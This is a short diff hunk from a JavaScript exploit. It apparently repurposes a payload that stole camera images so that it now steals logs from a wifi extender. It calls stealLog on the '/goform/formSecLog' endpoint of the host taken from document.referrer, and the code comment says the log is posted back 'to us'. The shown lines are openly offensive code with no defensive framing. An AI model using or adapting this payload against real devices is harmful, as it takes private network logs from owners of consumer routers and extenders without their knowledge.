@@ -38,5 +38,5 @@ function stealLog(theUrl)
     return data;
 }
 
-// get the image from the camera and post it to us
+// get the log from the wifi extender and post it to us
 stealLog( document.referrer.split('/')[2] + '/goform/formSecLog' );
